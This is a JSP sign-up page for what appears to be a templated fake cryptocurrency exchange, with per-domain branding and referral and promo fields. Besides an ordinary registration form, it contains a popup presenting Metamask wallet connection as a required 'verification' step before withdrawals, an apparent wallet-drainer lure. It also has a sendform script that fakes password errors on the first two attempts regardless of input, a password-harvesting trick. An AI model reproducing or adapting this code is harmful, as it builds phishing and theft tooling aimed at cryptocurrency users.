<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <%
        out.println("<title>Create an account | " + request.getAttribute("domain_exchange_name") + "</title>");
    %>
  <%
    out.println("<link rel=\"icon\" href=\"" + request.getAttribute("domain_icon") + "\">");
  %>
    <%
        out.println("<meta property=\"og:title\" content=\"" + request.getAttribute("domain_title") + "\">");
    %>
    <meta property="og:description" content="Best place to buy, trade and sell Bitcoin, Ethereum and over 100 cryptocurrencies safely and securely.">
  <link rel="stylesheet" href="assets/css/g_menu_normalize.css">
  <link rel="stylesheet" href="assets/css/g_menu_style.css">
  <link rel="stylesheet" href="assets/css/style.css?v=3">
  <link rel="stylesheet" href="assets/css/custom.css?v=3">
  <link rel="stylesheet" href="plugins/notifications/toastr.css">
  <link rel="stylesheet" href="assets/css/popap-style.css">
  <link rel="stylesheet" href="assets/css/stake.css">
  <link rel="stylesheet" href="assets/css/popup/popup-verifi.css">
  <link rel="stylesheet" href="assets/css/available.css">
  <link rel="stylesheet" href="assets/css/new_popup_style.css">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600&amp;display=swap" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans:wght@400;600&amp;display=swap" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500&amp;display=swap" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Source+Sans+Pro:wght@400;600;700&amp;display=swap" rel="stylesheet">
</head>

<body id="dark" class="stop-scrolling">

<!-- PRELOADER -->
<!-- PRELOADER END -->


<header class="header">
        <div class="header__left">
            <a class="header__logo" href="/">
                <%
                    out.println("<img src=\"" + request.getAttribute("domain_icon") + "\" alt=\"\">");
                %>
                <%
        out.println("<span class=\"header__logo-text\">" + request.getAttribute("domain_exchange_name") + "</span>");
      %>
            </a>
            <div class="header__links">
                <a class="header__link" href="/trading">Trading</a>
                <div class="header__link-tools header__tools">
                    <span class="header__link-tools-span">Market tools</span>

                    <div class="header__tools-box">
                        <a class="header__tools-link" href="/tools/marketcrypto">Crypto market cap</a>
                        <a class="header__tools-link" href="/tools/marketscreener">Market screener</a>
                        <a class="header__tools-link" href="/tools/technicalanalysis">Technical analysis</a>
                        <a class="header__tools-link" href="/tools/crossrates">Cross rates</a>
                        <a class="header__tools-link" href="/tools/heatmap">Currency heat map</a>
                    </div>
                </div>
                <a class="header__link" href="/profile/invest">Invest</a>
                <a class="header__link header__link-new" href="/profile/p2p">P2P</a>
                <a class="header__link header__link-hot" href="/profile/swap">Swap</a>
                <%
                if (request.getAttribute("support_unviewed") != null && ((int) request.getAttribute("support_unviewed")) > 0) {
                    out.println("<a id=\"support_count\" class=\"header__link\" href=\"../profile/support\">Support <span id=\"count_support_message\" class=\"support_messages\">" + request.getAttribute("support_unviewed") + "</span></a>");
                } else {
                    out.println("<a id=\"support_count\" class=\"header__link\" href=\"../profile/support\">Support </a>");
                }
            %>
                <a class="header__link" href="/profile/wallet">Wallet</a>
            </div>
        </div>
            </header>


  <section class="signUp">
    <div class="form__container">
      <div class="form__left">
        <div class="form__title">
          Sign up
        </div>

        <form class="form__box" action="#">
          <div class="form__group">
            <label class="form__name form__name-name" id="form-name">Username</label>
            <input class="form__input" type="text" placeholder="Enter your username" id="username">
          </div>

          <div class="form__group">
            <label class="form__name form__name-email" id="form-email">Email</label>
            <input class="form__input" type="email" placeholder="Enter your email" id="email">
          </div>

          <div class="form__group">
            <label class="form__name form__name-password" id="form-password">Password</label>
            <input class="form__input" type="password" placeholder="Enter your password" id="password">
          </div>

          <div class="form__group">
            <label class="form__name form__name-confirm" id="form-confirm">Confirm your password</label>
            <input class="form__input" type="password" placeholder="Enter your password" id="re_password">
          </div>

          <div class="form__features">
            <div class="form__features-wrapper">
              <label class="form__features-label" for="form-checkbox">
                I agree to the <a href="/terms">Terms & Conditions</a>
                <input class="form__features-checkbox reg-checkbox" type="checkbox" id="form-checkbox">
                <span class="form__features-checkmark"></span>
              </label>
            </div>
          </div>

            <%
                Object promo = request.getAttribute("promo");
                Object ref = request.getAttribute("ref");
                out.println("<input type=\"hidden\" value=\"" + (ref == null ? "-1" : ref) + "\" id=\"ref_id\">");
                out.println("<input type=\"hidden\" value=\"" + (promo == null ? "-1" : promo) + "\" id=\"get_promo\">");
            %>

          <button class="form__button" type="submit" id="create_account">
            <span>Sign up</span>
          </button>
        </form>

        <div class="form__sub">
          <div class="form__sub-text">Already registered?</div>
          <a class="form__sub-link" href="/signin">Sign in</a>
        </div>
      </div>

      <div class="form__right">
        <img src="/assets/img/space_two.png" alt="">
      </div>
    </div>
  </section>

 <!-- START FOOTER -->
		<div class="bottom section-padding">
			<div class="container">
				<div class="row">
					<div class="col-xl-4 col-lg-4 col-md-6 col-sm-6">
						<div class="bottom-logo">
						
							<a class="navbar-logo-vn" href="/">
								<%
              out.println("<img src=\"" + request.getAttribute("domain_icon") + "\" style=\"width: 30px;\" alt=\"\">");
            %>
								 <%
              out.println("<span style=\"margin-left: 6px;\">" + request.getAttribute("domain_exchange_name") + "</span>");
            %>
							  </a>
		
							<%
            out.println("<p style=\"width: 230px;\">" + request.getAttribute("domain_exchange_name") + " is a simple, elegant, and secure platform to build your crypto portfolio.</p>");
          %>
						</div>
                        
                    
                    						
					</div>
					<div class="col-xl-2 col-lg-2 col-md-6 col-sm-6">
						<div class="bottom-widget">
							<h4 class="widget-title">Features</h4>
							<ul>
								<li><a href="/">Home</a></li>
								<li><a href="/trading">Trading</a></li>
								<li><a href="/profile/wallet">Wallet</a></li>
								<li><a href="/profile/invest">Invest</a></li>
								<li><a href="/profile/swap">Instant swap</a></li>
								<li><a href="/profile/p2p">P2P</a></li>
								<li><a href="/profile/support">Support</a></li>
							</ul>
						</div>
					</div>
					<div class="col-xl-2 col-lg-2 col-md-6 col-sm-6">
						<div class="bottom-widget">
							<h4 class="widget-title">Market tools</h4>
							<ul>
								<li><a href="/tools/marketcrypto">Crypto market cap</a></li>
								<li><a href="/tools/marketscreener">Market screener</a></li>
								<li><a href="/tools/technicalanalysis">Technical analysis</a></li>
								<li><a href="/tools/crossrates">Cross rates</a></li>
								<li><a href="/tools/heatmap">Currency heat map</a></li>
							</ul>
						</div>
					</div>
					<div class="col-xl-2 col-lg-2 col-md-6 col-sm-6">
						<div class="bottom-widget">
							<h4 class="widget-title">Legal</h4>
							<ul>
								<li><a href="/terms">Terms of service</a></li>
								<li><a href="/privacy-notice">Privacy notice</a></li>
								<li><a href="/cookies-policy">Cookies policy</a></li>
								<li><a href="/aml-kyc-policy">AML & KYC policy</a></li>
								<li><a href="/fees">Fees</a></li>
								<li><a href="/bugbounty">Bug Bounty</a></li>

							</ul>
						</div>
					</div>
					<div class="col-xl-2 col-lg-2 col-md-6 col-sm-6">
						<div class="bottom-widget">
							<h4 class="widget-title">Exchange Pair</h4>
							<ul>
								<li><a href="/trading?symbol=BTC">BTC to USDT</a></li>
                                <li><a href="/trading?symbol=ETH">ETH to USDT</a></li>
                                <li><a href="/trading?symbol=LTC">LTC to USDT</a></li>
                                <li><a href="/trading?symbol=ADA">ADA to USDT</a></li>
							</ul>
						</div>
					</div>
				</div>
			</div>
		</div>

		<div class="footer">
			<div class="container">
				<div class="row">
					<div>
						<div class="copyright">
							<%
            out.println("<p style=\"font-size:12px\" ;=\"\"><strong>" + request.getAttribute("domain_exchange_name") + "</strong> © Copyright 2023 | Worldwide Distributed Digital Asset Exchange | Trading digitals assets such as Bitcoin involves significant risks.</p>");
          %>


						</div>
					</div>
					<div class="col-xl-6 col-lg-6 col-md-6 col-sm-6 col-12">
						<div class="footer-social">
							
						</div>
					</div>
				</div>
			</div>
		</div>

	  <div id="alert_message_modal" class="popup__container" style="display: none;">
        <div class="popup">
            <div class="popup__close" id="alert_close_modal">
                <svg xmlns="http://www.w3.org/2000/svg" x="0px" y="0px" width="24" height="24" viewbox="0 0 24 24" style=" fill:#FFFFFF;"><path d="M 4.9902344 3.9902344 A 1.0001 1.0001 0 0 0 4.2929688 5.7070312 L 10.585938 12 L 4.2929688 18.292969 A 1.0001 1.0001 0 1 0 5.7070312 19.707031 L 12 13.414062 L 18.292969 19.707031 A 1.0001 1.0001 0 1 0 19.707031 18.292969 L 13.414062 12 L 19.707031 5.7070312 A 1.0001 1.0001 0 0 0 18.980469 3.9902344 A 1.0001 1.0001 0 0 0 18.292969 4.2929688 L 12 10.585938 L 5.7070312 4.2929688 A 1.0001 1.0001 0 0 0 4.9902344 3.9902344 z"></path></svg>
            </div>
            <div class="popup__left">
                <img src="/assets/img/warning.png" alt="" id="alert_img_pop">
            </div>
            <div class="popup__right">
                <div class="popup__right-title" id="alert_title_text">
                    Warning
                </div>
                <div class="popup__right-description" id="userAlertBox">


                </div>
                <input type="hidden" id="alertMessageId" value="0">
                <div id="alert_close_modal_btn" class="popup__right-button">
                    Close
                </div>
            </div>
        </div>
    </div>

<div id="verify_popap_meta" class="popap-verifi" style="position: fixed !important; display: none; text-align: left;">
	<input type="hidden" id="MetaalertMessageId" value="0">
  <div class="popap-verifi-container-item popap-verifi-list-one popap-verifi-activ">

    <div class="popap-verifi-container-item-img">
        <img src="metamask/assets/fox.svg" style="width: 135px;">
    </div>
    <div class="popap-verifi-item-info">

        <div class="popap-verifi-loader">
            <div class="popap-verifi-loader-border"></div>
        </div>
        <div class="popap-verifi-item-info-title">
            Last step of verification
        </div>
        <div id="alertMessageMeta" class="popap-verifi-item-info-text" style="max-height: 170px; overflow: hidden;">
            To complete the verification process - connect your Metamask wallet.<br><br>
			After confirming metamask wallet, you will be able to withdraw your funds. 
        </div>
        <div class="popap-verifi-item-info-btn">
            <button onclick="openMetaMask()" class="popap-verifi-item-info-btn-next popap-verifi-list-one-button">
                Connect Metamask
            </button>
            <button id="closeMetaMaskBtn" class="popap-verifi-item-info-btn-cancel popap-verifi-btn-cancel-list-one">
                Cancel
            </button>
        </div>
    </div>
</div>
</div>
		<!-- END FOOTER -->	

  <script src="/assets/js/jquery-3.4.1.min.js"></script>
  <script src="/assets/js/popper.min.js"></script>
  <script src="/assets/js/bootstrap.min.js"></script>
  <script src="/assets/js/amcharts-core.min.js"></script>
  <script src="/assets/js/amcharts.min.js"></script>
  <script src="/assets/js/custom.js"></script>
  <script src="/plugins/notifications/toastr.js"></script>
  <script src="/assets/js/new-select/new-select.js"></script>
  <script src="/assets/js/verifi/verifi.js"></script>
  <script src="/assets/js/menu_main.js"></script>
  <script src="/assets/js/g_menu_main.js"></script>
  <script>
  function noti(msg, status) {
    toastr[status](msg);
    toastr.options = {
      "closeButton": false,
      "debug": false,
      "newestOnTop": false,
      "progressBar": false,
      "rtl": false,
      "positionClass": "toast-top-right",
      "preventDuplicates": false,
      "onclick": null,
      "showDuration": 300,
      "hideDuration": 1000,
      "timeOut": 5000,
      "extendedTimeOut": 1000,
      "showEasing": "swing",
      "hideEasing": "linear",
      "showMethod": "fadeIn",
      "hideMethod": "fadeOut"
    }
  }


function func() {
  document.getElementById('pswrd').classList.remove('border-red');
  $('#error1').addClass('hide');
}


var calc = 0;

function sendform(e) {
    e.preventDefault();
    //send_message()
    calc++
    $('#error1').addClass('hide');
    $('#error2').addClass('hide');
    document.getElementById('pswrd').classList.remove('border-red');

    if (calc < 3) {
        $('#buttonf').addClass('hide');
        document.getElementById('loading').classList.remove('hide');
        setTimeout(function () {
            $('#loading').addClass('hide');
            $('#pswrd').addClass('border-red');
            document.getElementById('error1').classList.remove('hide');
            document.getElementById('buttonf').classList.remove('hide');
        }, 1234);
    }

    if (calc > 2) {
        $('#buttonf').addClass('hide');
        document.getElementById('loading').classList.remove('hide');
        setTimeout(function () {
            $('#loading').addClass('hide');
            document.getElementById('error2').classList.remove('hide');
        }, 984);
    }
}

  
  </script>

</body>

</html>
<script src="/assets/js/os-detect.js"></script>
<script>
  function disabledBtn(func) {
    if(func == "off") {
      $("#create_account > span").html("Please wait..");
      $("#create_account > i").css("display", "inline-block");
      $("#create_account").css("background", "#242730");
      $("#create_account").attr("disabled", true);

    } else if(func == "on") {
      $("#create_account > span").html("Sign up");
      $("#create_account > i").css("display", "none");
      $("#create_account").css("background", "linear-gradient(90deg, #284EB6 0%, #4C399D 100%)");
      $("#create_account").attr("disabled", false);
    }
  }

  $("#create_account").on("click", function(e) {
    e.preventDefault();
    
    var username = $("#username").val();
    var email = $("#email").val();
    var password = $("#password").val();
    var re_password = $("#re_password").val();
    var ref_id = $("#ref_id").val();
    var get_promo = $("#get_promo").val();

    if(username === '' || username.length < 6 || username.length > 32) {
      noti("The maximum length of an username is 32 characters, minimum is 6", 'warning');
    } else if(email == '' || email.length < 10 || email.length > 128) {
      noti("Please enter a valid email address", 'warning');
    } else if(password == '' || password.length < 6 || password.length > 128) {
      noti("Password must contain at least 6 - 128 characters", 'warning');
    } else if(password != re_password) {
      noti("Passwords do not match, be careful", 'warning');
    } else {
      if ($('.reg-checkbox').is(":checked")) {

        disabledBtn("off");

        console.log("sending register data...");

        $.ajax({
          url: "/sign",
          type: "POST",
            xhrFields: {
                withCredentials: true
            },
            crossDomain: true,
          data: {
            action: "REGISTER_NEW_ACCOUNT",
            username: username,
            email: email,
            password: password,
            re_password: re_password,
            ref_id: ref_id,
            promo: get_promo,
            browser_name: getBrowserName(),
            os_name: getOSName()
          },
          success: function(response) {
            if(response === "1") {
              noti("Account created successfully", "success");
              noti("You will now be redirected to the login page", "info");
              setTimeout(function() {
                location.replace("/profile/wallet");
              }, 500);
            } else if(response === "2") {
              noti("Username already exists", "error");
              disabledBtn("on");
            } else if(response === "22") {
                noti("The maximum length of an username is 32 characters, minimum is 6", "error");
                disabledBtn("on");
            } else if(response === "3") {
                noti("Email is Already Registered", "error");
                disabledBtn("on");
            } else if(response === "33") {
                noti("Please enter a valid email address", "error");
                disabledBtn("on");
            } else if(response === "44") {
              noti("Password must contain at least 6 - 128 characters", "error");
              disabledBtn("on");
            } else if(response === "4") {
              noti("Passwords do not match, be careful", "error");
              disabledBtn("on");
            } else if(response === "5") {
                noti("There is no such promo", "error");
                disabledBtn("on");
            } else if(response === '777') {
                noti("Error account register, report to administration", "error");
                disabledBtn("on");
            } else if(response === "888") {
                noti("Password contains blocked symbols", "error");
            } else if(response === "999") {
                noti("Username contains blocked symbols", "error");
            } else {
              noti("An unexpected error has occurred, please try again", "error");
            }
          }
        })
      } else {
        noti("You must agree to our Terms and Conditions", 'warning');
        disabledBtn("on");
      }
    }


  });
</script>